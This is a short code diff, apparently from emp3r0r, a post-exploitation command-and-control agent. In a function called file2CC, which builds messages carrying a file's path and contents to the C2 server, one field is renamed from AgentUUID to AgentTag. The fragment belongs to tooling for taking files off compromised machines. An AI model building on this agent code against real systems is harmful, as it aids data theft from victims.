@@ -39,7 +39,7 @@ func file2CC(filepath string, offset int64) (checksum string, err error) {
 
 	fileData := emp3r0r_data.MsgTunData{
 		Payload: "FILE" + emp3r0r_data.OpSep + filepath + emp3r0r_data.OpSep + payload,
-		Tag:     emp3r0r_data.AgentUUID,
+		Tag:     emp3r0r_data.AgentTag,
 	}
 
 	// send
